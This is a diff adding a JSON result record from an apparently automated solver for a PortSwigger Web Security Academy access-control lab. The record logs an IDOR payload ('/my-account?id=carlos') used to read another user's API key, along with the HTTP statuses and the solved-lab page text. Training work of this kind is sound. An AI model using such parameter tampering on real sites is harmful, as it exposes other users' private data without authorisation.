@@ -1,0 +1,29 @@
+{
+  "labIndex": 21,
+  "category": "Broken Access Control",
+  "officialUrl": "https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter",
+  "technique": "IDOR em /my-account?id=carlos para obter API key e submeter a solucao",
+  "payload": "/my-account?id=carlos; answer=<API key de carlos>",
+  "launch": {
+    "officialUrl": "https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter",
+    "url": "https://0a0b006104599b3d8034495f00ad00cd.web-security-academy.net/",
+    "base": "https://0a0b006104599b3d8034495f00ad00cd.web-security-academy.net",
+    "title": "User ID controlled by request parameter",
+    "attempt": 1
+  },
+  "http": {
+    "loginStatus": 302,
+    "carlosStatus": 200,
+    "keyFound": true,
+    "submitStatus": 200
+  },
+  "instanceBase": "https://0a0b006104599b3d8034495f00ad00cd.web-security-academy.net",
+  "bannerText": "User ID controlled by request parameter\nBack to lab description  \nLAB\n\nSolved",
+  "solved": true,
+  "statusClass": "widgetcontainer-lab-status is-solved",
+  "statusText": "LAB\n\nSolved",
+  "text": "User ID controlled by request parameter\nBack to lab description  \nLAB\n\nSolved\n\nCongratulations, you solved the lab!\nShare your skills! \n \n Continue learning\nHome\n\n|\n\nMy account\nBabbage Web Spray\n $49.66\nView details\nThe Trolley-ON\n $73.33\nView details\nWTF? - The adult party game\n $94.89\nView details\nPhotobomb Backdrops\n $97.03\nView details\nZZZZZZ Bed - Your New Home Office\n $3.76\nView details\nMore Than Just Birdsong\n $80.53\nView details\nHologram Stand In\n $75.48\nView details\nSarcastic 9 Ball\n $29.58\nView details\nLightbulb Moments\n $86.50\nView details\nGiant Pillow Thing\n $80.35\nView details\nPest Control Umbrella\n $5.59\nView details\nPortable Hat\n $63.64\nView details\nThe Bucket of Doom\n $12.58\nView details\nRobot Home Security Buddy\n $94.90\nView details\nSix Pack Beer Belt\n $49.49\nView details\nFur Babies\n $67.04\nView details\nThe Alternative Christmas Tree\n $22.32\nView details\nWhat Do You Meme?\n $44.03\nView details\nGrow Your Own Spy Kit\n $40.87\nView details\nCheshire Cat Grin\n $80.50\nView details",
+  "title": "User ID controlled by request parameter",
+  "url": "https://0a0b006104599b3d8034495f00ad00cd.web-security-academy.net/",
+  "evidenceScreenshot": "../screenshots/21-user-id-controlled-by-request-parameter-solved.png"
+}
